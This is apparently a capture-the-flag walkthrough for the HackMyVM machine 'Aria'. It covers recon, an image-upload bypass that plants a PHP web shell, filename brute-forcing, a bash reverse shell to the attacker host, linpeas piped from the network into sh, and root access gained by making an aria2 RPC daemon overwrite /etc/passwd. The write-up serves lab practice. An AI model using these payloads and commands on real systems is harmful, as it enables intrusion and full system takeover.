# Aria

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.122:1337
Open 10.0.2.122:22
Open 10.0.2.122:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.122
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp   open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-title: Ultra-Secure Naming Service
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
1337/tcp open  waste?  syn-ack
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/aria/writeup.png)

### Upload Bypass

Upload is successful with **PHP Short Tags**
```bash
└─$ date +%s && curl 'http://10.0.2.122/upload.php' -F 'file="GIF89;<?=`$_REQUEST[0]`?>"; type=image/gif; filename=letmein.php'
1764670664
...
<div class="msg success">File uploaded successfully.</div>
...
```

### Upload Fuzzing

Now we need to fuzz for filename
```bash
└─$ for filename in $(seq $(( 1764670664 + 1000 )) -1 $(( 1764670664 - 2000 ))); do echo -n "$filename.php" | md5sum | cut -d' ' -f1; done > filenames.txt
└─$ ffuf -u 'http://10.0.2.122/uploads/FUZZ' -w filenames.txt
# Nothing
```

Looking closer at Ultra-Secure Naming it doesn't use `-` symbol, but `·` sooooo is it timestamp + random number?
```bash
#!/bin/bash

TARGET_URL="http://10.0.2.122"
UPLOAD_ENDPOINT="${TARGET_URL}/upload.php"
UPLOADS_DIR="${TARGET_URL}/uploads"
WORDLIST="filenames.txt"
TIME_DELTA=3
PAYLOAD='GIF89;<?=`$_REQUEST[0]`?>'

log()   { echo -e "\033[0;32m[+]\033[0m $*"; }

# Get start time
start_time=$(date +%s)
log "Upload timestamp: $start_time"

# Upload the file
log "Uploading payload..."
curl "$UPLOAD_ENDPOINT" -F "file=\"${PAYLOAD}\"; type=image/gif; filename=letmein.php" -so /dev/null

# Generate wordlist
log "Generating wordlist (range: ±${TIME_DELTA} seconds, rand: 1-1000)..."
python3 -c "
import hashlib
start = $start_time
delta = $TIME_DELTA
for t in range(start - delta, start + delta + 1):
    for r in range(1, 1001):
        h = hashlib.md5(f'{t}{r}'.encode()).hexdigest()
        print(f'{h}.php\n{h}.gif')
" > "$WORDLIST"

wordlist_size=$(wc -l < "$WORDLIST")
log "Generated $wordlist_size filenames"

# Find the uploaded file
log "Scanning for uploaded file..."
ffuf -u "${UPLOADS_DIR}/FUZZ" -w "$WORDLIST"

log "Done!"
```

```bash
142ac4e68f7d0b406a5e3fb71c5b8396.php [Status: 500, Size: 6, Words: 1, Lines: 1, Duration: 48ms]
```

### RCE

Hmmmmmm.... wot
```bash
└─$ curl 'http://10.0.2.122/uploads/142ac4e68f7d0b406a5e3fb71c5b8396.php' --data-urlencode '0=id' -s | xxd
00000000: 4749 4638 393b                           GIF89;
```

Update payload
```bash
PAYLOAD='GIF89;<?= phpinfo(); ?>'
```

`disable_functions` prevents us from code execution, AFAIK ticks are basically `shell_exec`

![writeup-1.png](/assets/pentest/hackmyvm/aria/writeup-1.png)

Update payload:
```bash
PAYLOAD='GIF89;<?= exec($_REQUEST[0]); ?>'
```

```bash
└─$ curl 'http://10.0.2.122/uploads/6800f21f050e7c532363d721f4dc41c4.php' --data-urlencode '0=id'
GIF89;uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

```bash
└─$ curl 'http://10.0.2.122/uploads/6800f21f050e7c532363d721f4dc41c4.php' --data-urlencode '0=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"'
└─$ penelope -p 4444
www-data@Aria:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### User.txt

```bash
www-data@Aria:/home/aria$ cat user.txt
flag{user-d13adadc6bbc1391394a5198cba2d1d7}
```

## Privilege Escalation

```
www-data@Aria:/tmp$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
...
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (ss)
tcp     LISTEN   0        128            127.0.0.1:6800          0.0.0.0:*
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*
tcp     LISTEN   0        5                0.0.0.0:1337          0.0.0.0:*
tcp     LISTEN   0        128                    *:80                  *:*
tcp     LISTEN   0        128                [::1]:6800             [::]:*
tcp     LISTEN   0        128                 [::]:22               [::]:*
...
╔══════════╣ Users with console
aria:x:1001:1001::/home/aria:/bin/bash
root:x:0:0:root:/root:/bin/bash
...
```

There was something odd about **user.txt**, the size of flag and size of file didn't exactly match.
```bash
www-data@Aria:/home/aria$ ls -alh
total 24K
drwxr-xr-x 2 aria aria 4.0K Aug 15 00:28 .
drwxr-xr-x 3 root root 4.0K Aug 14 21:39 ..
lrwxrwxrwx 1 root root    9 Aug 15 00:28 .bash_history -> /dev/null
-rw-r--r-- 1 aria aria  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 aria aria 3.5K Apr 18  2019 .bashrc
-rw-r--r-- 1 aria aria  807 Apr 18  2019 .profile
-rw-r--r-- 1 root root  404 Aug 15 00:23 user.txt

www-data@Aria:/home/aria$ xxd user.txt
00000000: 666c 6167 7b75 7365 722d 6431 3361 6461  flag{user-d13ada
00000010: 6463 3662 6263 3133 3931 3339 3461 3531  dc6bbc1391394a51
00000020: 3938 6362 6132 6431 6437 7d0a e280 8be2  98cba2d1d7}.....
00000030: 808c e280 8ce2 808c e280 8be2 808c e280  ................
00000040: 8be2 808b e280 8be2 808c e280 8ce2 808b  ................
00000050: e280 8ce2 808c e280 8ce2 808c e280 8be2  ................
00000060: 808c e280 8ce2 808b e280 8ce2 808b e280  ................
00000070: 8ce2 808c e280 8be2 808c e280 8ce2 808b  ................
00000080: e280 8be2 808c e280 8be2 808c e280 8be2  ................
00000090: 808c e280 8ce2 808b e280 8ce2 808c e280  ................
000000a0: 8ce2 808b e280 8be2 808b e280 8ce2 808c  ................
000000b0: e280 8ce2 808b e280 8ce2 808b e280 8be2  ................
000000c0: 808b e280 8ce2 808b e280 8be2 808b e280  ................
000000d0: 8be2 808b e280 8be2 808c e280 8ce2 808b  ................
000000e0: e280 8ce2 808c e280 8be2 808c e280 8be2  ................
000000f0: 808c e280 8ce2 808b e280 8be2 808b e280  ................
00000100: 8be2 808c e280 8be2 808c e280 8ce2 808c  ................
00000110: e280 8ce2 808b e280 8ce2 808b e280 8be2  ................
00000120: 808c e280 8ce2 808b e280 8be2 808c e280  ................
00000130: 8be2 808c e280 8be2 808b e280 8ce2 808b  ................
00000140: e280 8ce2 808c e280 8be2 808c e280 8be2  ................
00000150: 808c e280 8ce2 808c e280 8be2 808b e280  ................
00000160: 8ce2 808c e280 8be2 808c e280 8ce2 808b  ................
00000170: e280 8be2 808c e280 8be2 808c e280 8be2  ................
00000180: 808c e280 8ce2 808b e280 8be2 808b e280  ................
00000190: 8ce2 808c                                ....
```

In VSCode you can toggle `Render Whitespace`, since we don't see any characters I think it's zero width characters?

![writeup-2.png](/assets/pentest/hackmyvm/aria/writeup-2.png)

Quick google led me to
- [HackIT CTF 2018 - Write-ups > Get Going - Misc](https://blog.raw.pm/en/HackIT-2018-write-ups/#1-Get-Going-Misc)
- [https://stegzero.com](https://stegzero.com)

![writeup-3.png](/assets/pentest/hackmyvm/aria/writeup-3.png)

Hmmmmmmmmmmmm

There's a service running on port 6800 which is related to aria2
- [https://github.com/aria2/aria2](https://github.com/aria2/aria2): aria2 is a lightweight multi-protocol & multi-source, cross platform download utility operated in command-line. It supports HTTP/HTTPS, FTP, SFTP, BitTorrent and Metalink.
- [https://aria2.github.io/manual/en/html/aria2c.html#rpc-authorization-secret-token](https://aria2.github.io/manual/en/html/aria2c.html#rpc-authorization-secret-token)
- [Hacking Aria2 RPC Daemon](https://paper.seebug.org/120/)
- [Security issues of Aria2 RPC](https://0x0d.im/posts/aria2-rpc-vulnerability/)
- [add download via http json rpc  #1856](https://github.com/aria2/aria2/issues/1856)

Add new user via `addUri`, I was not able to make local files work so I spawned a server. Use `"allow-overwrite": "true"` to overwrite existing file, not to create new one.
```bash
www-data@Aria:/tmp$ cp /etc/passwd /tmp
www-data@Aria:/tmp$ echo "pwn:$(openssl passwd -6 -salt x y):0:0:root:/root:/bin/bash" >> /tmp/passwd
www-data@Aria:/tmp$ timeout 30 python3 -m http.server -d /tmp &
www-data@Aria:/tmp$ curl 0:6800/jsonrpc \
    -H 'Content-Type: application/json' \
    -d '{
        "jsonrpc": "2.0", 
        "id": "1", 
        "method": "aria2.addUri", 
        "params": [
            "token:maze-sec", 
            ["http://localhost:8000/passwd"], 
            { "dir": "/etc", "out": "passwd", "allow-overwrite": "true" }
        ]
    }'

www-data@Aria:/tmp$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
aria:x:1001:1001::/home/aria:/bin/bash
pwn:$6$x$oznOqkjAFKGu.2xNYeb1KoRKm/KJBGXlycJYIuGidRwif7dneFQvmqq4SGwXV.ZRoYjuOfKpoAHJ26Ekl3OUt1:0:0:root:/root:/bin/bash
```

```bash
www-data@Aria:/tmp$ su - pwn
Password: y
root@Aria:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@Aria:~# cat /root/root.txt
flag{root-374495cbd5d79b6e45b7778cbac070cc}
```